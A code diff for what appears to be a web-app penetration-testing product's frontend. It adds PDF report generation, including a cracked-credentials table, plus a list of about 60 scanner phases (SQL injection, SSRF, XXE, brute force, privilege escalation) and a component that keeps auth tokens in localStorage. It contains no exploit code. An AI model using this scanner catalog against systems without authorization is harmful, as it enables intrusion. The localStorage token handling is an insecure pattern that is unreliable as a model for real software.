@@ -1302,6 +1302,119 @@ function generatePDF(reportData) {
       y += _stLines.length * 3.8 + 4;
     }
 
+    // Tools Used section removed 2026-06-09: scanner count now appears in
+    // the Scan Coverage section below (DATA/EMPTY/SKIPPED/ERROR breakdown).
+    if(false && toolsUsed&&toolsUsed.length>0){
+      y = sectionHead("Tools Used",y);
+      y = tableHeader(["TOOL","PURPOSE","COST"],[40,110,30],y);
+      const toolInfo={
+        wafw00f:     ["WAF Detection & Fingerprinting","FREE"],
+        whatweb:     ["Technology Stack Fingerprinting","FREE"],
+        nmap:        ["Port & Service Scanning","FREE"],
+        gobuster:    ["Directory & File Enumeration","FREE"],
+        nikto:       ["Web Vulnerability Scanning","FREE"],
+        sqlmap:      ["SQL Injection Testing","FREE"],
+        dig:         ["DNS Enumeration","FREE"],
+        sslscan:     ["SSL/TLS Configuration Analysis","FREE"],
+        ssl:         ["SSL/TLS Configuration Analysis","FREE"],
+        curl:        ["Security Headers & Cookie Analysis","FREE"],
+        headers:     ["HTTP Security Headers Check","FREE"],
+        cookies:     ["Cookie Security Flags Analysis","FREE"],
+        cors:        ["CORS Misconfiguration Testing","FREE"],
+        xsser:       ["XSS (Cross-Site Scripting) Testing","FREE"],
+        xss:         ["XSS (Cross-Site Scripting) Testing","FREE"],
+        sublist3r:   ["Subdomain Discovery & Enumeration","FREE"],
+        subdomains:  ["Subdomain Discovery & Enumeration","FREE"],
+        cms:         ["CMS Detection & Version Analysis","FREE"],
+        theharvester:["OSINT & Email Recon","FREE"],
+        whois:       ["Domain WHOIS Lookup","FREE"],
+        masscan:     ["Fast Network Port Scanning","FREE"],
+        dnsrecon:    ["DNS Reconnaissance","FREE"],
+        dirb:        ["Directory Brute Force","FREE"],
+        wfuzz:       ["Web Application Fuzzing","FREE"],
+        nuclei: ["Community Vuln Templates (15k+ checks)","FREE"],
+        ffuf:         ["Fast Web Fuzzer / Directory Brute Force","FREE"],
+        wpscan:       ["WordPress Vulnerability Scanning","FREE"],
+        arjun:        ["HTTP Parameter Discovery","FREE"],
+        commix:       ["OS Command Injection Testing","FREE"],
+        lfi:          ["Path Traversal / LFI Testing","FREE"],
+        openredirect: ["Open Redirect Detection","FREE"],
+        sensitivefiles:["Sensitive File Exposure Detection","FREE"],
+        hydra:        ["Authentication Brute Force Testing","FREE"],
+        ssrf:         ["Server-Side Request Forgery Testing","FREE"],
+        xxe:          ["XML External Entity Injection Testing","FREE"],
+        clickjacking: ["Clickjacking / UI Redress Detection","FREE"],
+        verbtamper:   ["HTTP Verb Tampering Analysis","FREE"],
+        pollution:    ["HTTP Parameter Pollution Testing","FREE"],
+        csrf:         ["Cross-Site Request Forgery Testing","FREE"],
+        idor:         ["Insecure Direct Object Reference Testing","FREE"],
+        ssti:         ["Server-Side Template Injection Testing","FREE"],
+        fileupload:   ["File Upload Vulnerability Testing","FREE"],
+        dataexfil:    ["Data Exfiltration Channel Detection","FREE"],
+        racecondition:["Race Condition Vulnerability Testing","FREE"],
+        rfi:          ["Remote File Inclusion Testing","FREE"],
+        deserial:     ["Insecure Deserialization Detection","FREE"],
+        smuggling:    ["HTTP Request Smuggling Detection","FREE"],
+        responsesplitting:["HTTP Response Splitting Testing","FREE"],
+        sessionfixation:  ["Session Fixation Detection","FREE"],
+        smb:          ["SMB Share & Service Enumeration","FREE"],
+        ftp:          ["FTP Service Enumeration","FREE"],
+        smtp:         ["SMTP User Enumeration","FREE"],
+        snmp:         ["SNMP Community String Testing","FREE"],
+        exploitsearch:["Known Exploit & CVE Search","FREE"],
+        protopollution:["Prototype Pollution Testing","FREE"],
+        typejuggling: ["PHP Type Juggling Detection","FREE"],
+        jwt:          ["JWT Token Attack Testing","FREE"],
+        graphql:      ["GraphQL Security Assessment","FREE"],
+        nosql:        ["NoSQL Injection Testing","FREE"],
+        oauth:        ["OAuth 2.0 / SAML Attack Testing","FREE"],
+        hostheader:   ["Host Header Injection Testing","FREE"],
+        websocket:    ["WebSocket Security Assessment","FREE"],
+        takeover:     ["Subdomain Takeover Detection","FREE"],
+        otp:          ["2FA / OTP Bypass Testing","FREE"],
+        // Vuln scanner backend tools (newer additions)
+        dns:              ["DNS Records & Configuration Lookup","FREE"],
+        techstack:        ["Technology Stack Fingerprinting","FREE"],
+        portscan:         ["TCP Port Scanning","FREE"],
+        ssl_cert:         ["SSL/TLS Certificate Audit","FREE"],
+        sqli:             ["SQL Injection (error/boolean/time-based)","FREE"],
+        cmd_injection:    ["OS Command Injection (OOB canary)","FREE"],
+        exposed_files:    [".env / .git / backup / config exposure","FREE"],
+        http_methods:     ["Dangerous HTTP Verbs (TRACE/PUT/DELETE)","FREE"],
+        open_redirect:    ["Open Redirect (host-verified)","FREE"],
+        mass_assignment:  ["Mass Assignment / Param Allow-list Bypass","FREE"],
+        access_control:   ["Access Control / Authorization Bypass","FREE"],
+        force_browse:     ["Forced Browsing / Hidden Paths","FREE"],
+        file_upload:      ["File Upload Validation Bypass","FREE"],
+        sensitive_data:   ["Sensitive Data Exposure (PII/secrets in responses)","FREE"],
+        stored_xss:       ["Stored XSS via Persistence Endpoints","FREE"],
+        spa_crawler:      ["SPA Endpoint Crawler (React/Vue/Angular)","FREE"],
+        headers:          ["HTTP Security Headers (CSP/HSTS/XFO)","FREE"],
+        cookies:          ["Cookie Attribute Audit (Secure/HttpOnly/SameSite)","FREE"],
+      };
+      for(let i=0;i<toolsUsed.length;i++){
+        const t=toolsUsed[i];
+        // Continue tools on a new page instead of truncating with "+N more"
+        if(y>=280){
+          newPage(); y = 20;
+          // Re-draw the column header on the new page so it stays readable
+          fillR(margin,y,contentW,7,DARK);
+          txt("TOOL",margin+3,y+4.8,8,WHITE,true);
+          txt("PURPOSE",margin+43,y+4.8,8,WHITE,true);
+          txt("COST",margin+155,y+4.8,8,WHITE,true);
+          y+=7;
+        }
+        const info=toolInfo[t]||["Security Tool","FREE"];
+        fillR(margin,y,contentW,6,i%2===0?LIGHT:WHITE);
+        hline(margin,y,pageW-margin,y,BORDER,0.2);
+        txt(t,margin+3,y+4.5,7.5,DGREEN,true);
+        txt(info[0],margin+43,y+4.5,7.5,DARK);
+        rrect(margin+153,y+1,20,4,1,[220,252,231]);
+        txt(info[1],margin+155,y+4.5,7,DGREEN,true);
+        y+=6;
+      }
+    }
+
     // ─── SCAN COVERAGE (DATA / EMPTY / SKIPPED / ERROR) ──────────
     // User explicit ask 2026-06-09: this breakdown is critical for auditor
     // trust; add it to every module's PDF. Counts DATA / EMPTY / SKIPPED /
@@ -2536,6 +2649,2330 @@ function PDFConfigModal({open, onClose, onGenerate, moduleLabel}) {
 }
 
 // Lightweight per-module PDF (VulnModule, PasswordModule, etc.)
+function generateModuleReport(reportData) {
+  const { moduleName, tool, toolLabel, target, findings, cracked, summary,
+          companyName, reporterName, reporterRole, template, date } = reportData;
+
+  const doc = new jsPDF({ orientation:"portrait", unit:"mm", format:"a4" });
+    const pageW=210, margin=15, contentW=180;
+    let y=0;
+
+    const ACCENT_MAP = {standard:[15,110,86],corporate:[59,130,246],red:[239,68,68],gold:[245,158,11]};
+    const GREEN  = ACCENT_MAP[template] || ACCENT_MAP.standard;
+    const DGREEN = GREEN.map(v=>Math.max(0,Math.round(v*0.7)));
+    const RED    = [162,28,28];
+    const ORANGE = [133,79,11];
+    const DARK   = [15,23,42];
+    const LIGHT  = [248,250,252];
+    const WHITE  = [255,255,255];
+    const BORDER = [226,232,240];
+    const GRAY   = [100,116,139];
+    const PURPLE = [109,40,217];
+
+    const fillR = (x,yy,w,h,c) => { doc.setFillColor(...c); doc.rect(x,yy,w,h,"F"); };
+    const rrect = (x,yy,w,h,r,c) => { doc.setFillColor(...c); doc.roundedRect(x,yy,w,h,r,r,"F"); };
+    const hline = (x1,y1,x2,y2,c,lw) => { doc.setDrawColor(...c); doc.setLineWidth(lw||0.3); doc.line(x1,y1,x2,y2); };
+    const txt = (t,x,yy,sz,c,bold,align) => {
+      doc.setFont("Arial", bold?"bold":"normal");
+      doc.setFontSize(sz||10);
+      doc.setTextColor(...(c||DARK));
+      doc.text(String(t),x,yy,{align:align||"left"});
+    };
+    const BLUE = [59,130,246];
+    const drawHeader = () => {
+      txt((companyName||"VulnusLab")+" — "+moduleName+" Report",margin,10,7,GRAY);
+      txt(date||new Date().toLocaleDateString("en-GB"),pageW-margin,10,7,GREEN,false,"right");
+    };
+    const newPage = () => { doc.addPage(); y=18; drawHeader(); };
+    const chk = n => { if(y+n>278) newPage(); };
+    const sectionHead = (title,yy) => {
+      txt(title,margin,yy,11,BLUE,true,"left");
+      return yy+9;
+    };
+    const tableHeader = (cols,widths,yy) => {
+      fillR(margin,yy,contentW,8,GREEN);
+      let cx=margin+3;
+      cols.forEach((c,i)=>{ txt(c,cx,yy+5.5,7.5,WHITE,true); cx+=widths[i]; });
+      return yy+8;
+    };
+
+    // ── COVER PAGE ──────────────────────────────────────────────
+    fillR(0,0,pageW,297,DARK);
+    // Top accent bar
+    fillR(0,0,pageW,3,GREEN);
+    // Module name
+    const cx=pageW/2;
+    doc.setFont("Arial","bold"); doc.setFontSize(9); doc.setTextColor(...GREEN);
+    doc.text((companyName||"VulnusLab").toUpperCase(),cx,42,{align:"center"});
+    doc.setFont("Arial","bold"); doc.setFontSize(22); doc.setTextColor(...WHITE);
+    doc.text(moduleName,cx,58,{align:"center"});
+    doc.setFont("Arial","normal"); doc.setFontSize(11); doc.setTextColor(...GRAY);
+    doc.text("Security Assessment Report",cx,67,{align:"center"});
+
+    // Info rows
+    const irows=[["Target",target||"—"],["Tool",toolLabel||tool||"—"],["Scan Date",date||new Date().toLocaleDateString("en-GB")],["Prepared By","__REPORTER__"]];
+    let iy=80;
+    irows.forEach(r=>{
+      const rh = r[1]==="__REPORTER__" ? 11 : 7;
+      fillR(margin,iy,contentW,rh,r[1]==="__REPORTER__"?[20,30,55]:[10,20,40]);
+      hline(margin,iy,margin+3,iy,GREEN,1.5);
+      txt(r[0],margin+6,iy+5,7.5,GRAY);
+      if(r[1]==="__REPORTER__"){
+        txt(reporterName||"VulnusLab Automated Pentest",margin+48,iy+4.5,8.5,WHITE,true);
+        txt(reporterRole||"Security Assessment Engine · vulnuslab.com",margin+48,iy+9,7,GRAY);
+      } else {
+        txt(String(r[1]),margin+48,iy+5,8.5,WHITE,true);
+      }
+      iy+=rh+2;
+    });
+
+    // Risk summary bar — RISK-SCORE-V2 (aligned with Vuln module: higher = worse).
+    const visFinds = (findings||[]).filter(f=>f.severity!=="INFO");
+    const _wapRiskBar = (() => {
+      const real = visFinds.filter(f =>
+        ["CRITICAL","HIGH","MEDIUM","LOW"].includes(f && f.severity));
+      if (real.length === 0) return {score: 5, label: "MINIMAL RISK", color: [15,118,82]};
+      const _cvss = f => {
+        const c = parseFloat(f.cvss || "0");
+        if (c > 0) return c;
+        return {CRITICAL:9.0, HIGH:7.5, MEDIUM:5.0, LOW:3.0}[f.severity] || 0;
+      };
+      let sum = 0, maxCvss = 0;
+      real.forEach(f => { const c = _cvss(f); sum += c; if (c > maxCvss) maxCvss = c; });
+      const raw = Math.min(70, sum * 2.5) + Math.min(30, maxCvss * 3);
+      const score = Math.round(Math.min(100, Math.max(5, raw)));
+      const label = score >= 80 ? "CRITICAL RISK" : score >= 60 ? "HIGH RISK" :
+                    score >= 40 ? "MODERATE RISK" : score >= 20 ? "LOW RISK" : "MINIMAL RISK";
+      const color = score >= 80 ? [162,28,28] : score >= 60 ? [194,65,12] :
+                    score >= 40 ? [133,79,11] : score >= 20 ? [202,138,4] : [15,118,82];
+      return {score, label, color};
+    })();
+    const riskScore = _wapRiskBar.score;
+    const rColor = _wapRiskBar.color;
+    const rDisp = _wapRiskBar.label;
+    if(iy < 225){
+      iy+=6;
+      fillR(margin,iy,contentW,14,LIGHT.map(v=>Math.round(v*0.12)));
+      hline(margin,iy,margin,iy+14,rColor,2);
+      doc.setFont("Arial","bold"); doc.setFontSize(20); doc.setTextColor(...rColor);
+      doc.text(String(riskScore),margin+6,iy+10);
+      doc.setFont("Arial","normal"); doc.setFontSize(8); doc.setTextColor(...GRAY);
+      doc.text("/100",margin+20,iy+10);
+      const trackX=margin+38, trackW=contentW-40, barFill=Math.max((riskScore/100)*trackW,2);
+      doc.setFillColor(30,40,60); doc.rect(trackX,iy+4,trackW,6,"F");
+      doc.setFillColor(...rColor); doc.rect(trackX,iy+4,barFill,6,"F");
+      doc.setFont("Arial","bold"); doc.setFontSize(8); doc.setTextColor(...rColor);
+      doc.text(rDisp,trackX+trackW+2,iy+9);
+    }
+
+    // Finding counts
+    iy+=22;
+    const countsBySev = {CRITICAL:0,HIGH:0,MEDIUM:0,LOW:0,INFO:0};
+    (findings||[]).forEach(f=>{ if(countsBySev[f.severity]!==undefined) countsBySev[f.severity]++; });
+    const sevEntries = Object.entries(countsBySev).filter(([,v])=>v>0);
+    if(sevEntries.length>0){
+      const bw = Math.min(30, contentW/sevEntries.length);
+      let bx=margin;
+      sevEntries.forEach(([sev,cnt])=>{
+        const [bg,lt]=sevColor(sev);
+        fillR(bx,iy,bw-2,16,lt.map(v=>Math.round(v*0.3)));
+        doc.setFont("Arial","bold"); doc.setFontSize(16); doc.setTextColor(...bg);
+        doc.text(String(cnt),bx+bw/2-2,iy+11,{align:"center"});
+        doc.setFontSize(6); doc.setTextColor(...GRAY);
+        doc.text(sev,bx+bw/2-2,iy+15.5,{align:"center"});
+        bx+=bw;
+      });
+    }
+
+    // Cover footer
+    txt("CONFIDENTIAL — Authorized Use Only — "+(companyName||"VulnusLab"),pageW/2,290,7,GRAY,false,"center");
+
+    // ── PAGE 2 — FINDINGS ───────────────────────────────────────
+    newPage();
+    y = sectionHead("Findings",y);
+
+    // Password module: show cracked credentials
+    if(cracked&&cracked.length>0){
+      y = tableHeader(["USERNAME","PASSWORD","SERVICE"],[60,60,60],y);
+      cracked.forEach((c,i)=>{
+        chk(7); fillR(margin,y,contentW,7,i%2===0?LIGHT:WHITE); hline(margin,y,pageW-margin,y,BORDER,0.2);
+        txt(c.username||"",margin+3,y+5,8.5,DARK,true);
+        txt(c.password||"",margin+63,y+5,8.5,RED,true);
+        txt(c.service||"",margin+123,y+5,8,GRAY);
+        y+=7;
+      });
+      y+=4;
+    }
+
+    // Vulnerability findings
+    const visF = (findings||[]).filter(f=>f.severity!=="INFO");
+    if(visF.length>0){
+      visF.forEach((f,idx)=>{
+        const dl=doc.splitTextToSize(f.detail||"",contentW-8);
+        const rl=doc.splitTextToSize(f.remediation||"Apply security hardening.",contentW-22);
+        const needed=Math.max(28, 19+(dl.length+rl.length)*4.5);
+        chk(needed);
+        const [bg,lt]=sevColor(f.severity);
+        fillR(margin,y,contentW,needed,idx%2===0?LIGHT:WHITE);
+        hline(margin,y,pageW-margin,y,BORDER,0.2);
+        hline(margin,y,margin,y+needed,bg,1.5);
+        txt(String(idx+1)+".",margin+2,y+6,7.5,GRAY,true);
+        rrect(margin+11,y+2,20,5,1,lt);
+        doc.setFont("Arial","bold"); doc.setFontSize(7); doc.setTextColor(...bg);
+        doc.text(f.severity,margin+12,y+6);
+        doc.setFont("Arial","normal"); doc.setFontSize(6.5); doc.setTextColor(...PURPLE);
+        doc.text((f.cwe||""),margin+35,y+6);
+        txt(f.cvss||"",margin+80,y+6,8,bg,true);
+        doc.setFont("Arial","normal"); doc.setFontSize(8); doc.setTextColor(...DARK);
+        doc.text(dl,margin+4,y+12);
+        const fixY=y+10+dl.length*4.5;
+        const fixH=rl.length*4.5+6;
+        fillR(margin+3,fixY,contentW-6,fixH,[240,253,244]);
+        hline(margin+3,fixY,margin+3,fixY+fixH,GREEN,1);
+        doc.setFont("Arial","bold"); doc.setFontSize(7); doc.setTextColor(...DGREEN);
+        doc.text("Fix:",margin+5,fixY+4.5);
+        doc.setFont("Arial","normal"); doc.setTextColor(...DARK);
+        doc.text(rl,margin+16,fixY+4.5);
+        y+=needed+2;
+      });
+    } else if(!cracked||cracked.length===0){
+      fillR(margin,y,contentW,10,LIGHT);
+      txt(summary||"No findings recorded for this scan.",margin+4,y+7,8.5,GRAY);
+      y+=12;
+    }
+
+    // INFO findings summary
+    const infoF = (findings||[]).filter(f=>f.severity==="INFO");
+    if(infoF.length>0){
+      chk(20); y+=4;
+      y = sectionHead("Informational",y);
+      infoF.slice(0,15).forEach((f,i)=>{
+        chk(7); fillR(margin,y,contentW,7,i%2===0?LIGHT:WHITE); hline(margin,y,pageW-margin,y,BORDER,0.2);
+        txt(f.detail||"",margin+3,y+5,8,GRAY);
+        y+=7;
+      });
+    }
+
+    // Borders + footers on all pages
+    const total=doc.internal.getNumberOfPages();
+    for(let i=1;i<=total;i++){
+      doc.setPage(i);
+      doc.setDrawColor(59,130,246); doc.setLineWidth(1.2);
+      doc.rect(0,0,210,297,'S');
+      if(i>=2){
+        txt((companyName||"VulnusLab")+" | CONFIDENTIAL",margin,290,6.5,GRAY);
+        txt("Page "+i+" of "+total,pageW-margin,290,6.5,BLUE,false,"right");
+      }
+    }
+
+    doc.save(`${(tool||moduleName.replace(/\s+/g,"_").toLowerCase())}_${_pdfFn(target)}_${_pdfDt()}.pdf`);
+}
+
+
+// ReconModule is defined below
+
+
+// ── Section 1: Reconnaissance & Fingerprinting (OSWA Phase 1) ──
+// ── Section 2: Discovery & Fuzzing ──────────────────────────────
+// ── Section 3: Injection Attacks (OSWA Core) ────────────────────
+// ── Section 4: Authentication & Session (OSWA + OSWE) ───────────
+// ── Section 5: File & Path Attacks (OSWA) ───────────────────────
+// ── Section 6: Network & Protocol Attacks (OSWA) ────────────────
+// ── Section 7: Modern Web Vulnerabilities (OSWE Focus) ──────────
+// ── Section 8: Infrastructure & Services (OSCP) ─────────────────
+// PHASES mirrors endpoints/webapp_orchestrator.py WEBAPP_TOOLS_BY_TIER exactly.
+// Curation 2026-05-24: dropped ssl (was a pointer to recon/tls_deep) + 4 dupes
+// (idor_detector / nosqli / forced_browsing / directory_brute). Final: 60 phases.
+const PHASES = [
+  // ── tier1_discovery (1) — runs FIRST, populates scan_state.json ─────
+  {name:"SPA Crawler",            tool:"spa_crawler",       endpoint:"/api/webapp/scan/spa_crawler",     icon:""},
+  // ── tier2_recon (2) ────────────────────────────────────────────────
+  {name:"CMS Detection",          tool:"cms",               endpoint:"/api/webapp/scan/cms",             icon:""},
+  {name:"Port Scanning",          tool:"portscan",          endpoint:"/api/webapp/scan/portscan",        icon:""},
+  // ── tier3_injection (4) — highest customer impact ──────────────────
+  {name:"XSS Testing",            tool:"xss",               endpoint:"/api/webapp/scan/xss",             icon:""},
+  {name:"SQL Injection",          tool:"sqli",              endpoint:"/api/webapp/scan/sqli",            icon:""},
+  {name:"Command Injection",      tool:"cmd_injection",     endpoint:"/api/webapp/scan/cmd_injection",   icon:""},
+  {name:"XXE Injection",          tool:"xxe",               endpoint:"/api/webapp/scan/xxe",             icon:""},
+  // ── tier4_auth (4) — auth & session ────────────────────────────────
+  {name:"Security Headers",       tool:"headers",           endpoint:"/api/webapp/scan/headers",         icon:""},
+  {name:"Cookie Analysis",        tool:"cookies",           endpoint:"/api/webapp/scan/cookies",         icon:""},
+  {name:"CSRF Testing",           tool:"csrf",              endpoint:"/api/webapp/scan/csrf",            icon:""},
+  {name:"JWT Attacks",            tool:"jwt",               endpoint:"/api/webapp/scan/jwt",             icon:""},
+  // ── tier5_file_path (2) ────────────────────────────────────────────
+  {name:"Path Traversal / LFI",   tool:"lfi",               endpoint:"/api/webapp/scan/lfi",             icon:""},
+  {name:"Exposed Files",          tool:"exposed_files",     endpoint:"/api/webapp/scan/exposed_files",   icon:""},
+  // ── tier6_network (5) — protocol attacks ───────────────────────────
+  {name:"CORS Testing",           tool:"cors",              endpoint:"/api/webapp/scan/cors",            icon:""},
+  {name:"SSRF Testing",           tool:"ssrf",              endpoint:"/api/webapp/scan/ssrf",            icon:""},
+  {name:"HTTP Methods",           tool:"http_methods",      endpoint:"/api/webapp/scan/http_methods",    icon:""},
+  {name:"Open Redirect",          tool:"open_redirect",     endpoint:"/api/webapp/scan/open_redirect",   icon:"↩"},
+  {name:"Clickjacking",           tool:"clickjacking",      endpoint:"/api/webapp/scan/clickjacking",    icon:""},
+  // ── tier7_access (4) — access control & modern API ─────────────────
+  {name:"IDOR",                   tool:"idor",              endpoint:"/api/webapp/scan/idor",            icon:""},
+  {name:"Mass Assignment",        tool:"mass_assignment",   endpoint:"/api/webapp/scan/mass_assignment", icon:""},
+  {name:"NoSQL Injection",        tool:"nosql",             endpoint:"/api/webapp/scan/nosql",           icon:""},
+  {name:"Broken Access Control",  tool:"access_control",    endpoint:"/api/webapp/scan/access_control",  icon:""},
+  // ── tier8_framework (9) — heavy / Kali-style ───────────────────────
+  {name:"Nikto",                  tool:"nikto",             endpoint:"/api/webapp/scan/nikto",           icon:""},
+  {name:"Nuclei Templates",       tool:"nuclei",            endpoint:"/api/webapp/scan/nuclei",          icon:""},
+  {name:"Force Browse",           tool:"force_browse",      endpoint:"/api/webapp/scan/force_browse",    icon:""},
+  {name:"File Upload",            tool:"file_upload",       endpoint:"/api/webapp/scan/file_upload",     icon:""},
+  {name:"SSTI",                   tool:"ssti",              endpoint:"/api/webapp/scan/ssti",            icon:""},
+  {name:"GraphQL Audit",          tool:"graphql",           endpoint:"/api/webapp/scan/graphql",         icon:"◈"},
+  {name:"Sensitive Data",         tool:"sensitive_data",    endpoint:"/api/webapp/scan/sensitive_data",  icon:""},
+  {name:"Stored XSS",             tool:"stored_xss",        endpoint:"/api/webapp/scan/stored_xss",      icon:""},
+  {name:"WordPress Scanner",      tool:"wpscan",            endpoint:"/api/webapp/scan/wpscan",          icon:""},
+  // ── tier9_ai_curated_discovery (3) ─────────────────────────────────
+  {name:"Param Discovery",        tool:"param_discovery",   endpoint:"/api/webapp/param_discovery",      icon:""},
+  {name:"HTML Crawler",           tool:"crawler",           endpoint:"/api/webapp/crawler",              icon:""},
+  {name:"Secrets Hunt",           tool:"secrets",           endpoint:"/api/webapp/secrets",              icon:""},
+  // ── tier10_modern_attacks (7) — AI-curated payload lists ───────────
+  {name:"LDAP Injection",         tool:"ldap_injection",    endpoint:"/api/webapp/ldap_injection",       icon:""},
+  {name:"CRLF Injection",         tool:"crlf_injection",    endpoint:"/api/webapp/crlf_injection",       icon:"↵"},
+  {name:"Prototype Pollution",    tool:"prototype_pollution", endpoint:"/api/webapp/prototype_pollution", icon:""},
+  {name:"Host Header Injection",  tool:"host_header_injection", endpoint:"/api/webapp/host_header_injection", icon:""},
+  {name:"Cache Poisoning",        tool:"cache_poisoning",   endpoint:"/api/webapp/cache_poisoning",      icon:""},
+  {name:"Deserialization Probe",  tool:"deserialization_probe", endpoint:"/api/webapp/deserialization_probe", icon:""},
+  {name:"HTTP Smuggling",         tool:"http_smuggling",    endpoint:"/api/webapp/http_smuggling",       icon:""},
+  // ── tier11_discovery_deep (7) ──────────────────────────────────────
+  {name:"Backup Files",           tool:"backup_files",      endpoint:"/api/webapp/backup_files",         icon:""},
+  {name:"Directory Listing",      tool:"directory_listing", endpoint:"/api/webapp/directory_listing",    icon:""},
+  {name:"Swagger Discovery",      tool:"swagger_discovery", endpoint:"/api/webapp/swagger_discovery",    icon:""},
+  {name:"GraphQL Introspection",  tool:"graphql_introspection", endpoint:"/api/webapp/graphql_introspection", icon:"◇"},
+  {name:"Retire.js",              tool:"retire_js",         endpoint:"/api/webapp/retire_js",            icon:""},
+  {name:"API Endpoint Fuzz",      tool:"api_endpoint_fuzz", endpoint:"/api/webapp/api_endpoint_fuzz",    icon:""},
+  {name:"Param Reflection",       tool:"param_reflection",  endpoint:"/api/webapp/param_reflection",     icon:""},
+  // ── tier12_auth_session (6) ────────────────────────────────────────
+  {name:"Broken Auth",            tool:"broken_auth",       endpoint:"/api/webapp/broken_auth",          icon:""},
+  {name:"Session Fixation",       tool:"session_fixation",  endpoint:"/api/webapp/session_fixation",     icon:""},
+  {name:"OAuth Redirect Bypass",  tool:"oauth_redirect_bypass", endpoint:"/api/webapp/oauth_redirect_bypass", icon:""},
+  {name:"Password Reset Flaws",   tool:"password_reset_flaws", endpoint:"/api/webapp/password_reset_flaws", icon:""},
+  {name:"Privilege Escalation",   tool:"privilege_escalation", endpoint:"/api/webapp/privilege_escalation", icon:""},
+  {name:"Authenticated Scan",     tool:"authenticated_scan", endpoint:"/api/webapp/authenticated_scan",  icon:""},
+  // ── tier13_modern_framework (6) ────────────────────────────────────
+  {name:"CSP Bypass",             tool:"csp_bypass",        endpoint:"/api/webapp/csp_bypass",           icon:""},
+  {name:"Weak Crypto",            tool:"weak_crypto",       endpoint:"/api/webapp/weak_crypto",          icon:""},
+  {name:"Race Condition",         tool:"race_condition",    endpoint:"/api/webapp/race_condition",       icon:""},
+  {name:"Drupal Scan",            tool:"drupal_scan",       endpoint:"/api/webapp/drupal_scan",          icon:""},
+  {name:"Joomla Scan",            tool:"joomla_scan",       endpoint:"/api/webapp/joomla_scan",          icon:""},
+  {name:"File Upload Bypass",     tool:"file_upload_bypass", endpoint:"/api/webapp/file_upload_bypass",  icon:""},
+];
+
+// Section header definitions — keyed by the first tool in each section.
+// Mirrors WEBAPP_TOOLS_BY_TIER in endpoints/webapp_orchestrator.py (13 tiers).
+const SECTION_HEADERS = {
+  "spa_crawler":           {label:"Section 1 — Discovery",                       sub:"Runs first • 1 scanner",     color:"#3b82f6"},
+  "cms":                   {label:"Section 2 — Reconnaissance & Fingerprinting", sub:"OSWA Phase 1 • 2 scanners",  color:"#06b6d4"},
+  "xss":                   {label:"Section 3 — Injection Attacks",               sub:"OSWA Core • 4 scanners",     color:"#ef4444"},
+  "headers":               {label:"Section 4 — Authentication & Session",        sub:"OSWA + OSWE • 4 scanners",   color:"#a855f7"},
+  "lfi":                   {label:"Section 5 — File & Path Attacks",             sub:"OSWA • 2 scanners",          color:"#f97316"},
+  "cors":                  {label:"Section 6 — Network & Protocol Attacks",      sub:"OSWA • 5 scanners",          color:"#0891b2"},
+  "idor":                  {label:"Section 7 — Access Control & Modern API",     sub:"OWASP A01/A04 • 4 scanners", color:"#14b8a6"},
+  "nikto":                 {label:"Section 8 — Framework-Specific & Heavy",      sub:"Kali-style • 9 scanners",    color:"#eab308"},
+  "param_discovery":       {label:"Section 9 — AI-Curated Discovery",            sub:"VL-FORGE • 3 scanners",      color:"#22c55e"},
+  "ldap_injection":        {label:"Section 10 — Modern Attack Surface",          sub:"AI payloads • 7 scanners",   color:"#84cc16"},
+  "backup_files":          {label:"Section 11 — Deep Discovery",                 sub:"Auxiliary • 7 scanners",     color:"#0ea5e9"},
+  "broken_auth":           {label:"Section 12 — Auth & Session (Extended)",      sub:"OWASP A07 • 6 scanners",     color:"#a855f7"},
+  "csp_bypass":            {label:"Section 13 — Modern & Framework-Specific",    sub:"OSWE Focus • 6 scanners",    color:"#ec4899"},
+};
+
+// Tools trial users can access in Web App Pentesting (Section 1 recon only)
+const TRIAL_TOOLS = new Set(["wafw00f","whatweb","cms","nmap","ssl"]);
+
+function WebAppModule(props) {
+  const token = props.token;
+  const isTrial      = props.isTrial || false;
+  const isSuperAdmin = props.isSuperAdmin || false;
+  const onRunningChange = props.onRunningChange || (() => {});
+  const [target,setTarget]     = useState("");
+  const [running,setRunning]   = useState(false);
+  const [curPhase,setCurPhase] = useState(-1);
+  const [done,setDone]         = useState([]);
+  const [failed,setFailed]     = useState([]);
+  const [skipped,setSkipped]   = useState([]);
+  const [allResults,setAll]    = useState({});
+  const [finished,setFinished] = useState(false);
+  const [lines,setLines]       = useState(["Ready — enter target URL and click Start"]);
+  const [tab,setTab]           = useState("phases");
+  const [stopped,setStopped]   = useState(false);
+  const stopRef                = useRef(false);
+  const [selectedPhases, setSelectedPhases] = useState(() => new Set(PHASES.map((_,i)=>i)));
+  const [showPDFModal, setShowPDFModal]     = useState(false);
+  const [showExportMenu, setShowExportMenu] = useState(false);
+  const [pdfConfig, setPDFConfig]           = useState({
+    // Identity
+    companyName:"VulnusLab",
+    customLogo:null, logoName:null,
+    // Reporter
+    reporterName:"VulnusLab Automated Pentest",
+    reporterRole:"Security Assessment Engine · vulnuslab.com",
+    // Recipient
+    preparedFor:"",
+    // Engagement
+    engagementId: "VL-" + new Date().getFullYear() + "-" + Math.random().toString(36).substring(2,7).toUpperCase(),
+    engagementStart:"", engagementEnd:"",
+    version:"v1.0 — FINAL",
+    // Classification
+    confidentiality:"CONFIDENTIAL",  // INTERNAL | CONFIDENTIAL | RESTRICTED
+    watermark:"",                     // "" | "DRAFT" | "DO NOT DISTRIBUTE" | custom
+    // Date
+    date: new Date().toLocaleDateString("en-GB",{day:"2-digit",month:"long",year:"numeric"}),
+    // Content overrides
+    customExecSummary:"",
+    customDisclaimer:"",
+    customFooterText:"",
+    // Theme
+    template:"standard",
+    // Security
+    encrypt:true,
+    password: Array.from(crypto.getRandomValues(new Uint8Array(9))).map(b=>"ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789"[b%55]).join(""),
+  });
+  const [authCookie, setAuthCookie]         = useState(() => localStorage.getItem("cyberAuthCookie")||"");
+  const [authBearer, setAuthBearer]         = useState(() => localStorage.getItem("cyberAuthBearer")||"");
+  const [showAuthPanel, setShowAuthPanel]   = useState(false);
+  // ── Auto-login fields. When the user fills these in and clicks the
+  // "Auto-login" button, we POST to /api/scan/login, capture the session
+  // cookie, and stash it in authCookie so every downstream scanner uses
+  // it automatically (existing plumbing handles the rest). ──
+  const [loginUrl, setLoginUrl]             = useState("");
+  const [loginUser, setLoginUser]           = useState("");
+  const [loginPass, setLoginPass]           = useState("");
+  const [autoLoginBusy, setAutoLoginBusy]   = useState(false);
+  const [autoLoginStatus, setAutoLoginStatus] = useState(null); // null | "ok" | "fail" | msg
